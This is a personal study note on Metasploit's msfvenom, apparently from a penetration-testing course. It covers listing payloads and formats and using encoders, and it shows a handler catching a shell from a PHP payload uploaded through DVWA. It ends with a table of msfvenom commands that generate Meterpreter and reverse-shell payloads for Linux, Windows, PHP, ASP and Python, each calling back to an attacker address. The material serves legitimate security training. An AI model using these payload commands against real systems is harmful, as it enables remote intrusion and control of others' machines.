---
title: MSFVENOM
updated: 2023-03-21T12:51:34.0000000+04:00
created: 2023-03-20T16:39:15.0000000+04:00
---

MSFVENOM
Monday, March 20, 2023
4:39 PM
Msfvenom, which replaced Msfpayload and Msfencode, allows you to generate payloads.

Msfvenom will allow you to access all payloads available in the Metasploit framework. Msfvenom allows you to create payloads in many different formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux, etc.).

**\# List out all the Payloads:**

msfvenom -l payloads

**\# Output Formats**

Msfvenom --list formats

**\# Encoders**

Contrary to some beliefs, encoders do not aim to bypass antivirus installed on the target system. As the name suggests, they encode the payload. While it can be effective against some antivirus software, using modern obfuscation techniques or learning methods to inject shellcode is a better solution to the problem. The example below shows the usage of encoding (with the -e parameter. The PHP version of Meterpreter was encoded in Base64, and the output format was raw.

![image1](image1-16.png)

**\# ---------------------------------------------------------Handlers--------------------------------------------------------------------**

Similar to exploits using a reverse shell, you will need to be able to accept incoming connections generated by the MSFvenom payload. When using an exploit module, this part is automatically handled by the exploit module, you will remember how the payload options title appeared when setting a reverse shell. The term commonly used to receive a connection from a target is 'catching a shell'. Reverse shells or Meterpreter callbacks generated in your MSFvenom payload can be easily caught using a handler.

The following scenario may be familiar; we will exploit the file upload vulnerability present in DVWA (Damn Vulnerable Web Application). For the exercises in this task, you will need to replicate a similar scenario on another target system, DVWA was used here for illustration purposes. The exploit steps are;

Generate the PHP shell using MSFvenom
Start the Metasploit handler
Execute the PHP shell

MSFvenom will require a payload, the local machine IP address, and the local port to which the payload will connect. Seen below, 10.0.2.19 is the IP address of the AttackBox used in the attack and local port 7777 was chosen.

![image2](image2-9.png)

1.  Once a payload is created, we will metasploit to become a listener, using the multi/handler

![image3](image3-3.png)

![image4](image4-2.png)

\# Other types of payloads

![image5](image5-2.png)

| Linux Executable and Linkable Format (elf) | msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf \> rev_shell.elf |
|--------------------------------------------|--------------------------------------------------------------------------------------------------|

| Windows | msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe \> rev_shell.exe |
|---------|------------------------------------------------------------------------------------------------|

| PHP | msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw \> rev_shell.php |
|-----|--------------------------------------------------------------------------------------------|

| ASP | msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp \> rev_shell.asp |
|-----|------------------------------------------------------------------------------------------------|

| Python | msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw \> rev_shell.py |
|--------|---------------------------------------------------------------------------------------|

